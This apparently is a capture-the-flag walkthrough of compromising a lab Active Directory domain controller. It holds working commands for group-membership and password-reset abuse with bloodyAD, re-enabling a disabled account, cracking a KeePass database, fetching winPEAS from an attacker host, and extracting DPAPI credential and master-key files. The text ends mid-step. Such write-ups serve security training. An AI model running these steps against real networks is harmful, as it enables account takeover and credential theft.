---
sticker: emoji//1f436
---

# PORT SCAN
---

| PORT     | SERVICE                |
|----------|------------------------|
| 53/tcp   | domain (Simple DNS Plus) |
| 88/tcp   | kerberos-sec (Microsoft Windows Kerberos) |
| 111/tcp  | rpcbind (2-4, RPC #100000) |
| 135/tcp  | msrpc (Microsoft Windows RPC) |
| 139/tcp  | netbios-ssn (Microsoft Windows netbios-ssn) |
| 389/tcp  | ldap (AD LDAP - PUPPY.HTB0) |
| 445/tcp  | microsoft-ds?          |
| 464/tcp  | kpasswd5?              |
| 593/tcp  | ncacn_http (RPC over HTTP 1.0) |
| 636/tcp  | tcpwrapped             |
| 2049/tcp | nlockmgr (1-4, RPC #100021) |
| 3260/tcp | iscsi?                 |
| 3268/tcp | ldap (AD LDAP - PUPPY.HTB0) |
| 3269/tcp | tcpwrapped             |
| 5985/tcp | http (Microsoft HTTPAPI httpd 2.0) |

# RECONNAISSANCE
---

As always, we are provided with credentials:

```
levi.james / KingofAkron2025!
```

First of all, let's begin our reconnaissance phase, we need to add `puppy.htb` to `/etc/hosts`:

```
echo '10.10.11.70 puppy.htb' | sudo tee -a /etc/hosts
```

Now, let's proceed, first of all let's check `smb`:

```
smbclient -L //10.10.11.70/ -U levi.james
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\levi.james]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      DEV-SHARE for PUPPY-DEVS
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

As seen, there's a `DEV` share on here, let's try to read it:

![](images/Pasted%20image%2020250610141456.png)

Unfortunately, we are unable to read this share, let's end `smb` enumeration for now, we can now proceed to use `nxc` to enumerate usernames on the domain:

```
nxc smb 10.10.11.70 -u levi.james -p KingofAkron2025! --users
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
SMB         10.10.11.70     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.70     445    DC               Administrator                 2025-02-19 19:33:28 0       Built-in account for administering the computer/domain
SMB         10.10.11.70     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.70     445    DC               krbtgt                        2025-02-19 11:46:15 0       Key Distribution Center Service Account
SMB         10.10.11.70     445    DC               levi.james                    2025-02-19 12:10:56 0
SMB         10.10.11.70     445    DC               ant.edwards                   2025-02-19 12:13:14 0
SMB         10.10.11.70     445    DC               adam.silver                   2025-06-11 02:19:30 0
SMB         10.10.11.70     445    DC               jamie.williams                2025-02-19 12:17:26 0
SMB         10.10.11.70     445    DC               steph.cooper                  2025-02-19 12:21:00 0
SMB         10.10.11.70     445    DC               steph.cooper_adm              2025-03-08 15:50:40 0
SMB         10.10.11.70     445    DC               [*] Enumerated 9 local users: PUPPY
```


Nice, got some usernames, time to use bloodhound to check what can we do:

```python
bloodhound-python -d PUPPY.HTB -u levi.james -p 'KingofAkron2025!' -gc DC.PUPPY.HTB -c All -ns 10.10.11.70 --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.puppy.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 18S
INFO: Compressing output into 20250610193934_bloodhound.zip
```


Nice, we got our zip file, let's open bloodhound and check the data:

> Note: If you want to flush all previous data from bloodhound, you can go to `http://localhost:7474` and perform the following query:

```
MATCH (n)
DETACH DELETE n
```

![](images/Pasted%20image%2020250610150847.png)

Now, as seen our current user is member of `HR` which has `GenericWrite` on `DEVELOPERS`, in this way, we may be able to read the `DEV` share we found at the start, let's abuse this `GenericWrite` privilege. 

Time to begin exploitation.


# EXPLOITATION
---

We already know the first thing we must do, since we were unable to read the share if we are a member of the developers group we must be able to read it now, let's use `bloodyAD` for it, refer to this fantastic article on how to exploit `GenericWrite DACL`:

Link: https://www.hackingarticles.in/genericwrite-active-directory-abuse/

```python
bloodyAD -u levi.james -d puppy.htb -p 'KingofAkron2025!' --host 10.10.11.70 add groupMember DEVELOPERS levi.james
```


We can check the user was successfully added to the group using `net rpc`:

```python
net rpc group members "DEVELOPERS" -U puppy.htb/levi.james%'KingofAkron2025!' -S 10.10.11.70
PUPPY\levi.james
PUPPY\ant.edwards
PUPPY\adam.silver
PUPPY\jamie.williams
```


Nice, it worked, we can now access the `DEV` share:

```
smbclient -U 'puppy.htb/levi.james%KingofAkron2025!' //10.10.11.70/DEV
```


![](images/Pasted%20image%2020250610153416.png)

As seen, we are now able to check the share, the most important stuff on here is the `recovery.kdbx` file, this is the `keepass` password database file, let's get it 

```
smb: \> get recovery.kdbx
getting file \recovery.kdbx of size 2677 as recovery.kdbx (6.6 KiloBytes/sec) (average 6.6 KiloBytes/sec)
```


Keepass databases are encrypted which means we need to use `john` to crack the master password, for this, we can use `keepass2john`:

```
keepass2john recovery.kdbx > hash.txt
! recovery.kdbx : File version '40000' is currently not supported!
```

We got an error, let's check it up:

![](images/Pasted%20image%2020250610153719.png)
![](images/Pasted%20image%2020250610153816.png)

Seems like we can use `keepass4brute`, since we need another version of john to perform the cracking, let's download the tool and try to crack the master password:

REPO: https://github.com/r3nt0n/keepass4brute


Before we start the script, we need to install `keepassxc`, if you're on arch you can do:

```
yay -S keepassxc
```

Otherwise, on kali do:

```
sudo apt update && sudo apt install keepassxc
```


Once we got it we can now run the script:

```
/keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 120 - Estimated time remaining: 11 weeks, 6 days
[+] Current attempt: liverpool

[*] Password found: liverpool
```

Didn't took too long, we got the password:

```
liverpool
```

Now, let's access the keepass db:

```
keepassxc recovery.kdbx
```

![](images/Pasted%20image%2020250610154330.png)

![](images/Pasted%20image%2020250610154342.png)

On here, we can see a bunch of credentials:

![](images/Pasted%20image%2020250610154435.png)

![](images/Pasted%20image%2020250610154443.png)

![](images/Pasted%20image%2020250610154452.png)

![](images/Pasted%20image%2020250610154500.png)


![](images/Pasted%20image%2020250610154508.png)

We need to go back to bloodhound to check what can we do with these new credentials for the users, 

```
steve.tucker: Steve2025!
samuel.blake: ILY2025!
jamie.williamson: JamieLove2025!
ant.edwards: Antman2025!
adam.silver: HJKL2025!
```

We got a bunch of credentials, a good approach is to test which of them have got `smb` and `winrm` access, for it, I created this simple script to automate it with `crackmapexec`:

```bash
#!/bin/bash

TARGET="10.10.11.70"
DOMAIN="PUPPY.HTB"
CREDS_FILE="creds.txt"  # Format: user:password

echo "[*] Starting SMB + WinRM check on $TARGET..."

while IFS=: read -r user pass; do
    echo -e "\n[*] Testing $user"

    echo "[+] SMB Shares:"
    crackmapexec smb $TARGET -u "$user" -p "$pass" -d "$DOMAIN" --shares 2>/dev/null

    echo "[+] WinRM Check:"
    crackmapexec winrm $TARGET -u "$user" -p "$pass" -d "$DOMAIN"
done < "$CREDS_FILE"

```

Save the above credentials as `creds.txt` and use the script, you will get this output:

![](images/Pasted%20image%2020250610155849.png)

The only user that we can authenticate with is the `ant.edwards` user all other users bring up `STATUS_LOGON_FAILURE`, if we check it up on bloodhound, we can find this:

![](images/Pasted%20image%2020250610155938.png)


As seen, `ant.edwards` is member of `senior devs` which got `GenericAll` over `Adam.Silver` user, abusing this we can force the password change for the user:

![](images/Pasted%20image%2020250610160308.png)

We can use `bloodyAD` again:

```python
bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip 10.10.11.70 set password adam.silver 'abc@123'
[+] Password changed successfully!
```

Ok, if we try to go to `winrm` right now, we are unable to do so, this happens because the account is `disabled`, we can check this by using `ldapsearch`:


```python
ldapsearch -x -D 'ant.edwards@puppy.htb' -w 'Antman2025!' -H ldap://10.10.11.70 -b 'DC=puppy,DC=htb' "(sAMAccountName=adam.silver)" userAccountControl

# extended LDIF
#
# LDAPv3
# base <DC=puppy,DC=htb> with scope subtree
# filter: (sAMAccountName=adam.silver)
# requesting: userAccountControl
#

# Adam D. Silver, Users, PUPPY.HTB
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
userAccountControl: 514

# search reference
ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

As seen:

```
userAccountControl: 514
```

`514` means the account is disabled, we need to enable it by changing the value to `512` which is the value for the enabled accounts:

```bash
echo -e "dn: CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB\nchangetype: modify\nreplace: userAccountControl\nuserAccountControl: 512" \
| ldapmodify -x -D "ant.edwards@puppy.htb" -w 'Antman2025!' -H ldap://10.10.11.70

modifying entry "CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB"
```

Nice, let's try going into `evil-winrm` now:

```
evil-winrm -i 10.10.11.70 -u 'adam.silver' -p 'abc@123'
```

![](images/Pasted%20image%2020250610161747.png)

Perfect, we were successfully able to get a session, let's proceed to privilege escalation.



# PRIVILEGE ESCALATION
---

If we check `C:\` we can find this:

```
*Evil-WinRM* PS C:\Users\adam.silver\Documents> dir c:\


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2025  10:48 AM                Backups
d-----         5/12/2025   5:21 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---          4/4/2025   3:40 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----          3/8/2025   9:00 AM                StorageReports
d-r---         6/10/2025   7:15 PM                Users
d-----         5/13/2025   4:40 PM                Windows
-a----         6/10/2025   7:17 PM            377 README.txt
```

Once we check inside of `backups`, we get this:

```
*Evil-WinRM* PS C:\Users\adam.silver\Documents> dir c:\Backups


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```

We got a site backup, let's download it to analyze it, we can use:

```
download 'C:\Backups\site-backup-2024-12-30.zip'
```

Once we got the file, we can find this inside of it:

```XML
assets  images  index.html  nms-auth-config.xml.bak

cat nms-auth-config.xml.bak 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

We got credentials for another user:

```
steph.cooper:ChefSteph2025!
```

We can go into `evil-winrm` with it:

```
evil-winrm -i 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!'
```

On here, we can run `winpeas` to get more info, get winPEAS from here:

```
https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASps1/winPEAS.ps1
```

You can download the file and get it onto the machine using:

```powershell
Invoke-WebRequest -Uri "http://10.10.15.10:8000/winPEAS.ps1" -OutFile "winPEAS.ps1"
```

Once download we can do:

```
. .\winPEAS.ps1
```

Now, once our scan finishes, we get a `winp.out` file, we can see this inside of it:

```powershell
The following information is curated. To get a full list of system information, run the cmdlet get-computerinfo
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        PRIMARY
The command completed successfully.

The system was unable to find the specified registry value: RunAsPPL / RunAsPPLBoot
The system was unable to find the specified registry value: LsaCfgFlags



Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
HKU                                    Registry      HKEY_USERS

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdat
                e
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows
PSChildName   : WindowsUpdate
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 1
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate

Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary

Computername    : DC
Software        : Microsoft Edge
Version         : 136.0.3240.64
Publisher       : Microsoft Corporation
InstallDate     : 20250512
UninstallString : "C:\Program Files (x86)\Microsoft\Edge\Application\136.0.3240.64\Installer\setup.exe" --uninstall
                  --msedge --channel=stable --system-level --verbose-logging
Architecture    : x64
Path            : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Edge


Computername    : DC
Software        : Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.36.32532
Version         : 14.36.32532.0
Publisher       : Microsoft Corporation
InstallDate     :
UninstallString : "C:\ProgramData\Package Cache\{410c0ee1-00bb-41b6-9772-e12c2828b02f}\VC_redist.x86.exe"  /uninstall
Architecture    : x64
Path            : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{410c0ee1-00bb-41b6-9772-e12c2
                  828b02f}


Computername    : DC
Software        : Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.36.32532
Version         : 14.36.32532
Publisher       : Microsoft Corporation
InstallDate     : 20250404
UninstallString : MsiExec.exe /I{73F77E4E-5A17-46E5-A5FC-8A061047725F}
Architecture    : x64
Path            : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{73F77E4E-5A17-46E5-A5FC-8A061
                  047725F}


Computername    : DC
Software        : Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.36.32532
Version         : 14.36.32532.0
Publisher       : Microsoft Corporation
InstallDate     :
UninstallString : "C:\ProgramData\Package Cache\{8bdfe669-9705-4184-9368-db9ce581e0e7}\VC_redist.x64.exe"  /uninstall
Architecture    : x64
Path            : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{8bdfe669-9705-4184-9368-db9ce
                  581e0e7}


Computername    : DC
Software        : Microsoft Visual C++ 2022 X86 Additional Runtime - 14.36.32532
Version         : 14.36.32532
Publisher       : Microsoft Corporation
InstallDate     : 20250404
UninstallString : MsiExec.exe /I{C2C59CAB-8766-4ABD-A8EF-1151A36C41E5}
Architecture    : x64
Path            : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{C2C59CAB-8766-4ABD-A8EF-1151A
                  36C41E5}


Computername    : DC
Software        : Microsoft Edge
Version         : 136.0.3240.64
Publisher       : Microsoft Corporation
InstallDate     : 20250512
UninstallString : "C:\Program Files (x86)\Microsoft\Edge\Application\136.0.3240.64\Installer\setup.exe" --uninstall
                  --msedge --channel=stable --system-level --verbose-logging
Architecture    : x86
Path            : HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Edge


Computername    : DC
Software        : Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.36.32532
Version         : 14.36.32532.0
Publisher       : Microsoft Corporation
InstallDate     :
UninstallString : "C:\ProgramData\Package Cache\{410c0ee1-00bb-41b6-9772-e12c2828b02f}\VC_redist.x86.exe"  /uninstall
Architecture    : x86
Path            : HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{410c0ee1-00bb-41b
                  6-9772-e12c2828b02f}


Computername    : DC
Software        : Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.36.32532
Version         : 14.36.32532
Publisher       : Microsoft Corporation
InstallDate     : 20250404
UninstallString : MsiExec.exe /I{73F77E4E-5A17-46E5-A5FC-8A061047725F}
Architecture    : x86
Path            : HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{73F77E4E-5A17-46E
                  5-A5FC-8A061047725F}


Computername    : DC
Software        : Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.36.32532
Version         : 14.36.32532.0
Publisher       : Microsoft Corporation
InstallDate     :
UninstallString : "C:\ProgramData\Package Cache\{8bdfe669-9705-4184-9368-db9ce581e0e7}\VC_redist.x64.exe"  /uninstall
Architecture    : x86
Path            : HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{8bdfe669-9705-418
                  4-9368-db9ce581e0e7}


Computername    : DC
Software        : Microsoft Visual C++ 2022 X86 Additional Runtime - 14.36.32532
Version         : 14.36.32532
Publisher       : Microsoft Corporation
InstallDate     : 20250404
UninstallString : MsiExec.exe /I{C2C59CAB-8766-4ABD-A8EF-1151A36C41E5}
Architecture    : x86
Path            : HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{C2C59CAB-8766-4AB
                  D-A8EF-1151A36C41E5}

# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost

127.0.0.1       localhost
127.0.0.1       puppy.htb



Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
APPDATA                        C:\Users\steph.cooper\AppData\Roaming
CommonProgramFiles             C:\Program Files (x86)\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   DC
ComSpec                        C:\Windows\system32\cmd.exe
DriverData                     C:\Windows\System32\Drivers\DriverData
LOCALAPPDATA                   C:\Users\steph.cooper\AppData\Local
NUMBER_OF_PROCESSORS           2
OS                             Windows_NT
Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPower
                               Shell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steph.cooper\AppData\Local\Microsoft\W
                               indowsApps
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         x86
PROCESSOR_ARCHITEW6432         AMD64
PROCESSOR_IDENTIFIER           AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
PROCESSOR_LEVEL                25
PROCESSOR_REVISION             0101
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files (x86)
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PROMPT                         $P$G
PSModulePath                   C:\Users\steph.cooper\Documents\WindowsPowerShell\Modules;C:\Program
                               Files\WindowsPowerShell\Modules;C:\Program Files
                               (x86)\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC                         C:\Users\Public
SystemDrive                    C:
SystemRoot                     C:\Windows
TEMP                           C:\Users\STEPH~1.COO\AppData\Local\Temp
TMP                            C:\Users\STEPH~1.COO\AppData\Local\Temp
USERDNSDOMAIN                  PUPPY.HTB
USERDOMAIN                     PUPPY
USERNAME                       steph.cooper
USERPROFILE                    C:\Users\steph.cooper
windir                         C:\Windows



Currently stored credentials:

* NONE *


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9


    Directory: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   8:14 AM          11068 DFBE70A7E5CC19A398EBF1B96859CE5D

Current LogonId is 0:0x280ed4

Cached Tickets: (0)
```


If we analyze the output, at the last part we can see this:

```powershell
Currently stored credentials:

* NONE *


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9


    Directory: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   8:14 AM          11068 DFBE70A7E5CC19A398EBF1B96859CE5D
```

These files correspond to `DPAPI`, DPAPI (Data Protection API) is a built-in Windows feature that allows applications and the operating system to securely store sensitive data, like passwords, encryption keys, and credentials. It uses the user’s or system’s credentials to encrypt and decrypt data, meaning only the same user or system can access the protected data. DPAPI is often used behind the scenes by browsers, the Credential Manager, and other Windows services. From a pentester's view, it’s important because if we get access to a user's context (e.g., via token impersonation or shell), we might be able to decrypt their stored secrets.

Knowing this, we can use `dpapy.py` from impacket to extract the hidden credentials, we need to get two files, the credential file and the master key, we can find them on:

```
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\

C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\
```

At this stage, if we cannot find the files on here, we need to reset the machine on `HTB` remember we are working on a shared instance, reset it and go into `evil-winrm` again:

```
dir "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials" -Force


Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

We found our first part needed for `dpapy.py`, download it:

```powershell
download "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9"
```

If download does not work, we can do:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9"))

AQAAAJIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAEiRqVXUSz0y3IeagtPkEBwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAAHEb7RgOmv+9Na4Okf93s5UAAAAABIAAAKAAAAAQAAAACtD/ejPwVzLZOMdWJSHNcNAAAAAxXrMDYlY3P7k8AxWLBmmyKBrAVVGhfnfVrkzLQu2ABNeu0R62bEFJ0CdfcBONlj8Jg2mtcVXXWuYPSiVDse/sOudQSf3ZGmYhCz21A8c6JCGLjWuS78fQnyLW5RVLLzZp2+6gEcSU1EsxFdHCp9cT1fHIHl0cXbIvGtfUdeIcxPq/nN5PY8TR3T8i7rw1h5fEzlCX7IFzIu0avyGPnrIDNgButIkHWX+xjrzWKXGEiGrMkbgiRvfdwFxb/XrET9Op8oGxLkI6Mr8QmFZbjS41FAAAADqxkFzw7vbQSYX1LftJiaf2waSc
```

Now, do:

```bash
echo "AQAAAJIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAEiRqVXUSz0y3IeagtPkEBwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAAHEb7RgOmv+9Na4Okf93s5UAAAAABIAAAKAAAAAQAAAACtD/ejPwVzLZOMdWJSHNcNAAAAAxXrMDYlY3P7k8AxWLBmmyKBrAVVGhfnfVrkzLQu2ABNeu0R62bEFJ0CdfcBONlj8Jg2mtcVXXWuYPSiVDse/sOudQSf3ZGmYhCz21A8c6JCGLjWuS78fQnyLW5RVLLzZp2+6gEcSU1EsxFdHCp9cT1fHIHl0cXbIvGtfUdeIcxPq/nN5PY8TR3T8i7rw1h5fEzlCX7IFzIu0avyGPnrIDNgButIkHWX+xjrzWKXGEiGrMkbgiRvfdwFxb/XrET9Op8oGxLkI6Mr8QmFZbjS41FAAAADqxkFzw7vbQSYX1LftJiaf2waSc" | base64 -d > steph_cred
```

Nice, first part done, let's check the `protect` directory now:

```powershell
dir C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\ -Force

Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         2/23/2025   2:36 PM                S-1-5-21-1487982659-1829050783-2281216199-1107
-a-hs-          3/8/2025   7:40 AM             24 CREDHIST
-a-hs-          3/8/2025   7:40 AM             76 SYNCHIST

dir C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107 -Force

Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred
``` 


We can find our master key on there, let's download it again:

```powershell
$path = "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407"
[Convert]::ToBase64String([IO.File]::ReadAllBytes($path))

AgAAAAAAAAAAAAAANQA1ADYAYQAyADQAMQAyAC0AMQAyADcANQAtADQAYwBjAGYALQBiADcAMgAxAC0AZQA2AGEAMABiADQAZgA5ADAANAAwADcAAABqVXUSz0wAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAsj8xITRBgEgAZOArghULmlBGAAAJgAAAA2YAAPtTG5NorNzxhcfx4/jYgxj+JK0HBHMu8jL7YmpQvLiX7P3r8JgmUe6u9jRlDDjMOHDoZvKzrgIlOUbC0tm4g/4fwFIfMWBq0/fLkFUoEUWvl1/BQlIKAYfIoVXIhNRtc+KnqjXV7w+BAgAAAIIHeThOAhE+Lw/NTnPdszJQRgAACYAAAANmAAAnsQrcWYkrgMd0xLdAjCF9uEuKC2mzsDC0a8AOxgQxR93gmJxhUmVWDQ3j7+LCRX6JWd1L/NlzkmxDehild6MtoO3nd90f5dACAAAAAAEAAFgAAADzFsU+FoA2QrrPuakOpQmSSMbe5Djd8l+4J8uoHSit4+e1BHJIbO28uwtyRxl2Q7tk6e/jjlqROSxDoQUHc37jjVtn4SVdouDfm52kzZT2VheO6A0DqjDlEB19Qbzn9BTpGG4y7P8GuGyN81sbNoLN84yWe1mA15CSZPHx8frov6YwdLQEg7H8vyv9ZieGhBRwvpvp4gTur0SWGamc7WN590w8Vp98J1n3t3TF8H2otXCjnpM9m6exMiTfWpTWfN9FFiL2aC7Gzr/FamzlMQ5E5QAnk63b2T/dMJnp5oIU8cDPq+RCVRSxcdAgUOAZMxPs9Cc7BUD+ERVTMUi/Jp7MlVgK1cIeipAl/gZz5asyOJnbThLa2ylLAf0vaWZGPFQWaIRfc8ni2iVkUlgCO7bI9YDIwDyTGQw0Yz/vRE/EJvtB4bCJdW+Ecnk8TUbok3SGQoExL3I5Tm2a/F6/oscc9YlciWKEmqQ=
```

Same procedure:

```bash
